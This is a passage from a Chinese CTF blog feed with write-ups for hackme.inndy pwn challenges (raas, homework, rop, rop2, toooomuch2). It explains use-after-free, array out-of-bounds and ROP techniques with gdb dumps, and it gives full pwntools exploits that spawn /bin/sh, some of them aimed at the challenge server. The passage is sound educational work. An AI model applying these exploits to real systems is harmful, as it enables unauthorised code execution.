(*v3)(v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>先malloc了12字节的堆</li><li>头4个字节存用于print结构体的函数指针</li><li>再4个字节存用于free结构体的函数指针</li><li>如果type是integer，最后四个字节存输入的整数，</li><li>如果type是string，获取长度，malloc一个指定长度的堆，新malloc的堆的指针存到之前那12字节的最后四个字节里</li></ul><p>利用思路：</p><ul><li>new 两个record，delete掉，这里的record类型随意，但是字符的要注意新new的长度不要等于12 </li><li>new一个字符串类型的record，长度为12，假设new的两个record是0、1，删除的顺序是0、1，那么这个时候在fastbin的链表里面是 1-&gt;0 ，new一个record，存函数指针那个堆复用了1的堆，用来存内容的那个堆是用了0的堆 </li><li>往0那个堆里面写我们想要的东西，再删除0的record，这样就能getshell</li></ul><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>进行以下操作：</p><ul><li>new index=1 int 0xff</li><li>new index=2 int 0x88</li><li>delete index=1</li><li>delete index=2</li><li>new index=3 str ‘aaaabbbbccc’</li><li>new index=4 str ‘dddd’</li></ul><p>先添加两个整数</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">32</span>wx <span class="number">0x0804c008</span></span><br><span class="line"><span class="number">0x804c008</span>:<span class="number">0x0804869e</span><span class="number">0x080486de</span><span class="number">0x000000ff</span><span class="number">0x00000011</span></span><br><span class="line"><span class="number">0x804c018</span>:<span class="number">0x0804869e</span><span class="number">0x080486de</span><span class="number">0x00000088</span><span class="number">0x00020fe1</span></span><br></pre></td></tr></table></figure><p>对应是：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">地址print函数指针free函数指针整型变量</span><br><span class="line"><span class="number">0x804c008</span><span class="number">0x0804869e</span><span class="number">0x080486de</span><span class="number">0x000000ff</span></span><br></pre></td></tr></table></figure><p>释放掉两个整数的堆：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">32</span>wx <span class="number">0x0804c008</span></span><br><span class="line"><span class="number">0x804c008</span>:<span class="number">0x00000000</span><span class="number">0x080486de</span><span class="number">0x000000ff</span><span class="number">0x00000011</span></span><br><span class="line"><span class="number">0x804c018</span>:<span class="number">0x0804c000</span><span class="number">0x080486de</span><span class="number">0x00000088</span><span class="number">0x00020fe1</span></span><br></pre></td></tr></table></figure><p>添加字符串aaaabbbbccc后的堆：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">32</span>wx <span class="number">0x9a49008</span></span><br><span class="line"><span class="number">0x9a49008</span>:<span class="number">0x00000000</span><span class="number">0x080486de</span><span class="number">0x000000ff</span><span class="number">0x00000011</span></span><br><span class="line"><span class="number">0x9a49018</span>:<span class="number">0x080486be</span><span class="number">0x08048705</span><span class="number">0x09a49028</span><span class="number">0x00000019</span></span><br><span class="line"><span class="number">0x9a49028</span>:<span class="number">0x61616161</span><span class="number">0x62626262</span><span class="number">0x0a636363</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x9a49038</span>:<span class="number">0x00000000</span><span class="number">0x00020fc9</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p>以看到，输出aaaabbbbccc的时候，占用的就是原来index=1的整数分配的空间。其中aaaa覆盖了print函数的指针，bbbb覆盖了free函数的指针。虽然index=1被释放了，但是指针还在。如果此时再调用do_del来释放index=1的内容，就可以控制EIP了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">r=process(<span class="string">'./raas'</span>)</span><br><span class="line"><span class="comment"># r=remote('hackme.inndy.tw',7719)</span></span><br><span class="line">elf=ELF(<span class="string">'./raas'</span>)</span><br><span class="line">system=elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(Index,Type,Length,Value)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"Act &gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Index &gt; "</span>,str(Index))</span><br><span class="line">r.sendlineafter(<span class="string">"Type &gt; "</span>,str(Type))</span><br><span class="line"><span class="keyword">if</span> Type==<span class="number">2</span>:</span><br><span class="line">r.sendlineafter(<span class="string">"Length &gt; "</span>,str(Length))</span><br><span class="line">r.sendlineafter(<span class="string">"Value &gt; "</span>,str(Value))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(Index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"Act &gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Index &gt; "</span>,str(Index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(Index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"Act &gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Index &gt; "</span>,str(Index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">20</span>,<span class="string">"0000"</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="number">20</span>,<span class="string">"1111"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="string">'sh\x00\x00'</span>+p32(system))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://genowang.github.io/2019/01/01/hackme-inndy-tw-PWN%E7%AC%94%E8%AE%B0/#onepunch" target="_blank" rel="noopener">https://genowang.github.io/2019/01/01/hackme-inndy-tw-PWN%E7%AC%94%E8%AE%B0/#onepunch</a></li><li><a href="https://blog.csdn.net/charlie_heng/article/details/78943796" target="_blank" rel="noopener">https://blog.csdn.net/charlie_heng/article/details/78943796</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;hackme-inndy-raas-wp&quot;&gt;&lt;a href=&quot;#hackme-inndy-raas-wp&quot; class=&quot;headerlink&quot; title=&quot;hackme.inndy raas wp&quot;&gt;&lt;/a&gt;hackme.inndy raas wp&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="writeup" scheme="http://zerokeeper.github.io/categories/writeup/"/>
    
    
      <category term="ctf" scheme="http://zerokeeper.github.io/tags/ctf/"/>
    
      <category term="hackme" scheme="http://zerokeeper.github.io/tags/hackme/"/>
    
      <category term="pwn" scheme="http://zerokeeper.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>hackme.inndy pwn write-up</title>
    <link href="http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html"/>
    <id>http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html</id>
    <published>2019-06-09T05:05:00.000Z</published>
    <updated>2019-10-21T11:07:25.699Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://hackme.inndy.tw" target="_blank" rel="noopener">hackme.inndy</a>上pwn的wp，题目难度不大</p><h2 id="catfalg"><a href="#catfalg" class="headerlink" title="catfalg"></a>catfalg</h2><p>签到题，直接nc连接，cat flag</p><h2 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h2><p>根据题目提示是数组越界漏洞，给了源码<a href="https://hackme.inndy.tw/static/pwn-easy.c" target="_blank" rel="noopener">https://hackme.inndy.tw/static/pwn-easy.c</a> 可以看到对数组下表并没有做检查，导致越界。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/09/1560051924.png" alt="Snipaste_2019-06-09_11-45-03.png"></p><p>ida分析，可以通过越界arr来覆盖run_program的返回地址到call_me_maybe函数的地址即可<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/09/1560053300.png" alt="Snipaste_2019-06-09_11-51-33.png"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/09/1560053307.png" alt="Snipaste_2019-06-09_11-52-29.png"></p><p>数组的首地址为ebp-34h,所以arr与ebp之间的偏移为0x34=52个字节。<br>52+ ebp + ret = 60 字节<br>60/4=15，即相对于arr来说，ret的索引为14<br>call_me_maybe 的地址为0x80485FB<br>最后exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process('./homework')</span></span><br><span class="line">r = remote(<span class="string">"hackme.inndy.tw"</span>,<span class="number">7701</span>)</span><br><span class="line"></span><br><span class="line">call_me_maybe=<span class="number">0x80485FB</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"name? "</span>,<span class="string">"pwn"</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"edit: "</span>,<span class="string">"14"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"many? "</span>,str(call_me_maybe))</span><br><span class="line">r.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"0"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/09/15600585919995.jpg" alt=""></p><p>很简单的栈溢出，只开启了NX保护，静态链接<br>偏移为0xc+0x4=16<br>题目提示使用rop，使用ROPgadget构造一个rop<br><code>ROPgadget --binary rop --ropchain</code><br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># r=process('./rop')</span></span><br><span class="line">r = remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7704</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'a'</span>*<span class="number">16</span>+p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="rop2"><a href="#rop2" class="headerlink" title="rop2"></a>rop2</h2><p>checksec</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure><p>ida f5代码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl main(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+5h] [ebp-33h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+9h] [ebp-2Fh]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+11h] [ebp-27h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+15h] [ebp-23h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+19h] [ebp-1Fh]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+1Dh] [ebp-1Bh]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+21h] [ebp-17h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+25h] [ebp-13h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+29h] [ebp-Fh]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [esp+2Dh] [ebp-Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [esp+2Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x1E</span>u);</span><br><span class="line">  v4 = <span class="string">' naC'</span>;</span><br><span class="line">  v5 = <span class="string">' uoy'</span>;</span><br><span class="line">  v6 = <span class="string">'vlos'</span>;</span><br><span class="line">  v7 = <span class="string">'ht e'</span>;</span><br><span class="line">  v8 = <span class="string">'\n?si'</span>;</span><br><span class="line">  v9 = <span class="string">'eviG'</span>;</span><br><span class="line">  v10 = <span class="string">' em '</span>;</span><br><span class="line">  v11 = <span class="string">'ruoy'</span>;</span><br><span class="line">  v12 = <span class="string">'por '</span>;</span><br><span class="line">  v13 = <span class="string">'iahc'</span>;</span><br><span class="line">  v14 = <span class="string">':n'</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  syscall(<span class="number">4</span>, <span class="number">1</span>, &amp;v4, <span class="number">42</span>);</span><br><span class="line">  <span class="built_in">overflow</span>();</span><br><span class="line">  <span class="built_in">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ida没能够识别出v4到v14的变量类型，v4的地址为bp-0x33，v15为bp-0x9，因此字符串长度为0x33 - 0x9 = 42，在v4上y一下，然后在弹出来的窗口上填入推断出来的数据类型char v4[42],调整后为</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, <span class="keyword">const</span> char **argv, <span class="keyword">const</span> char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4[<span class="number">42</span>]; <span class="comment">// [esp+5h] [ebp-33h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x1E</span>u);</span><br><span class="line">  strcpy(v4, <span class="string">"Can you solve this?\nGive me your ropchain:"</span>);</span><br><span class="line">  syscall(<span class="number">4</span>, <span class="number">1</span>, v4, <span class="number">42</span>);</span><br><span class="line">  overflow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>overflow（）</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> overflow()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  syscall(<span class="number">3</span>, <span class="number">0</span>, &amp;v1, <span class="number">1024</span>);</span><br><span class="line">  <span class="keyword">return</span> syscall(<span class="number">4</span>, <span class="number">1</span>, &amp;v1, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里涉及到了调用syscall，可查阅<a href="http://shell-storm.org/shellcode/files/syscalls.html" target="_blank" rel="noopener">http://shell-storm.org/shellcode/files/syscalls.html</a> 得知，程序中的syscall(4,1,&amp;v4,42) 和syscall(3,0,&amp;v1,1024) 分别调用了write()函数和read函数的系统调用，在v1只有0xc大小却读取了1024字节导致溢出。<br>这次不能直接利用ROPgadget找rop，考虑使用syscall执行系统命令，execve()的编号是11，所以最终要执行syscall(11, “/bin/sh”, 0, 0)，即execve(“/bin/sh”, 0, 0)，文件中没有/bin/sh字符串，所以还需要写入/bin/sh到bss段</p><ul><li>首先利用 syscall() 调用 read，从标准输入读入 /bin/sh，写入 bss。执行完之后再执行一遍overflow()</li><li>然后利用 syscall() 调用 execve，获取shell</li></ul><p>syscall函数的调用方法是：调用地址 + 返回地址 + 参数<br>exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *  </span><br><span class="line"><span class="comment"># p = remote('hackme.inndy.tw',7703) </span></span><br><span class="line">p=process('./rop2') </span><br><span class="line">elf = ELF('./rop2')  </span><br><span class="line">bss = elf.bss()  </span><br><span class="line">syscall = elf.symbols['syscall']  </span><br><span class="line">overflow = elf.symbols['overflow']   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if args.G:</span><br><span class="line">gdb.attach(p)  </span><br><span class="line">  </span><br><span class="line">payload = 'a'*0xC + 'bbbb' + p32(syscall) + p32(overflow) <span class="comment"># junk + target_address  + return_address  </span></span><br><span class="line">payload += p32(3) + p32(0) + p32(bss) + p32(8) <span class="comment">#syscall(3,0,bss_add,8)  </span></span><br><span class="line">p.send(payload)  </span><br><span class="line">p.send(<span class="string">"/bin/sh\x00"</span>)  </span><br><span class="line">  </span><br><span class="line">payload1 = 'a'*0xc + <span class="string">"BBBB"</span> + p32(syscall) + p32(0xdeadbeaf)</span><br><span class="line">payload1 += p32(0xb) + p32(bss) + p32(0) + p32(0)  <span class="comment">#syscall(0xb,bss_add,0,0) = execve("bin/sh",0,0)  </span></span><br><span class="line">  </span><br><span class="line">p.send(payload1)  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="toooomuch"><a href="#toooomuch" class="headerlink" title="toooomuch"></a>toooomuch</h2><p>很简单，ida查看获得passcode，然后nc连接上，二分法猜数字即可</p><h2 id="toooomuch2"><a href="#toooomuch2" class="headerlink" title="toooomuch2"></a>toooomuch2</h2><p>题目和上题一样只是这次要求getshell</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="literal">No</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">disabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br><span class="line"><span class="attr">RWX:</span>      <span class="string">Has</span> <span class="string">RWX</span> <span class="string">segments</span></span><br></pre></td></tr></table></figure><p>什么都没有开<br>代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">toooomuch</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me your passcode: "</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">strcpy</span>(passcode, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( check_passcode() )</span><br><span class="line">    result = play_a_game();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"You are not allowed here!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gets存在溢出，什么保护都没有开<br>这题有两种解法：</p><ul><li>一种是把shellcode写到bss段上然后返回到bss段执行。</li><li>另一种是直接把system执行用到的参数写到bss段，因为程序里面有system函数，可以溢出到system函数的地址，然后布置参数。</li></ul><p>exp1：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 